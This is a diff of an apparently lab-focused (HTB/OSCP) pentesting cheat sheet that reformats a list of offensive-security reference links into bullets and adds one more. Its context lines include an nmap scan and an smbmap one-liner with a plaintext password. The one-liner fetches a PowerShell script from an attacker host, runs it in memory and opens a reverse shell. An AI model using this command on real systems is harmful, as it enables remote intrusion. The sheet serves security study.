@@ -55,17 +55,18 @@
 17. [`Exploits & CVE Reference - HTB Boxes`](#`Exploits%20&%20CVE%20Reference%20-%20HTB%20Boxes`)
 ### Links
 
-[LZone Cheat Sheet](https://lzone.de/#/LZone%20Cheat%20Sheets)  - Someone Name Lzone prepare a nice checklist on Docker container, CI/CD and various other things. Good One to check out
-[CyberKhalid Cheat Sheet](https://cyberkhalid.github.io/categories/) - Just Another Checklist (FTP, AD, Kerberos, LDAP, Linux Persistence, Linux Privilege Escalation, SNMP, SSH, VNC, Windows Persistence, Telnet, etc.)
-[Windows Privilege Escalation](https://github.com/x0xr00t/PayloadsAllTheThings-1/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)  - PayloadAllTheThing GitHub Repo
-[Windows List of Privileges and Possible Ways to Exploit It](https://github.com/gtworek/Priv2Admin?tab=readme-ov-file)  - Scroll Down a bit to check the list.
-[Windows : Early Enumerations and Privilege Escalation](https://notes.shashwatshah.me/windows/local-privilege-escalation/privileges-information)  - Expand the list from the left menu
-[The Hacker Recipes](https://www.thehacker.recipes) - Its Just Like HackTricks
-[GitHub - OSCP CheatSheet ](https://github.com/0xsyr0/OSCP?tab=readme-ov-file#information-gathering) - One of the OSCP Cheat Sheet
-[OSCP Cheat Sheet](https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet) - One more OSCP CheatSheet
-[SysInternals Tools EXEs](https://live.sysinternals.com/) - This link contains just Sysinternals Tools (System Internals) EXE file ready to use.
-[CTF 101](https://ctf101.org/) - CTF Play Book
-[Attacking Active Directory 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/) - In-Detail Active Directory Methods 
+- [LZone Cheat Sheet](https://lzone.de/#/LZone%20Cheat%20Sheets)  - Someone Name Lzone prepare a nice checklist on Docker container, CI/CD and various other things. Good One to check out
+- [CyberKhalid Cheat Sheet](https://cyberkhalid.github.io/categories/) - Just Another Checklist (FTP, AD, Kerberos, LDAP, Linux Persistence, Linux Privilege Escalation, SNMP, SSH, VNC, Windows Persistence, Telnet, etc.)
+- [Windows Privilege Escalation](https://github.com/x0xr00t/PayloadsAllTheThings-1/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)  - PayloadAllTheThing GitHub Repo
+- [Windows List of Privileges and Possible Ways to Exploit It](https://github.com/gtworek/Priv2Admin?tab=readme-ov-file)  - Scroll Down a bit to check the list.
+- [Windows : Early Enumerations and Privilege Escalation](https://notes.shashwatshah.me/windows/local-privilege-escalation/privileges-information)  - Expand the list from the left menu
+- [The Hacker Recipes](https://www.thehacker.recipes) - Its Just Like HackTricks
+- [GitHub - OSCP CheatSheet ](https://github.com/0xsyr0/OSCP?tab=readme-ov-file#information-gathering) - One of the OSCP Cheat Sheet
+- [OSCP Cheat Sheet](https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet) - One more OSCP CheatSheet
+- [SysInternals Tools EXEs](https://live.sysinternals.com/) - This link contains just Sysinternals Tools (System Internals) EXE file ready to use.
+- [CTF 101](https://ctf101.org/) - CTF Play Book
+- [Attacking Active Directory 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/) - In-Detail Active Directory Methods 
+- [Sfoffo - Pentesting Notes](https://notes.sfoffo.com/)  - Another OSCP Checklist
 ### Nmap
 ```
 # nmap -p- -Pn <IP>
@@ -141,7 +142,6 @@ putty.exe
 ```
 # smbmap -u'C.Smith' -p 'xRxRxPANCAK3SxRxRx' -x 'powershell iex (New-Object Net.WebClient).DownloadString("http://10.10.14.2/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 4444' -H 10.10.10.178 
 ```
-
 
 ### CURL 
 
